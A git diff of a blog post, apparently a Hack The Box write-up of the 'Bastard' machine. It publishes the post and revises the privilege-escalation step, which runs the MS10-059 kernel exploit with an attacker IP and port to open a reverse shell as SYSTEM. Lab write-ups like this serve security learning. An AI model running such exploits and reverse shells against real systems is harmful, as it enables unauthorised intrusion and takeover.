@@ -1,7 +1,6 @@
 ---
 title: "HTB - Bastard without MetaSploit"
 date: 2021-03-03
-draft: true
 categories: ["hacking", "write-ups"]
 tags: [HTB]
 featuredImage: "/images/2021/03/Bastard_Logo.png"
@@ -88,14 +87,13 @@ After searching, I found [Windows Exploit Suggester](https://github.com/AonCyber
 
 So going down the list I found one kernel exploit that seemed particularly interesting : [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059).
 
-Once uploaded, I tried to run it like the usage said but it returned a weird error, about not being able to connect to cmd.exe, but still getting a `SYSTEM` token.
+Once uploaded, just run it without argument and it'll tell you that it requires an IP and port, in order to pop a reverse shell.
 
-So I just re-ran it with the following command while using a listener on my attacking machine :
+So I ran it like so :
 
 ```text
 MS10-059.exe "$attacking_ip" "1234"
 ```
-NB : I probably got mixed up, and `Churraskito.exe` requires the arguments shown in the usage, and `MS10-059.exe` uses the one I provided on my second try.
 
 Hopefully, it worked and gave me `SYSTEM` :
 
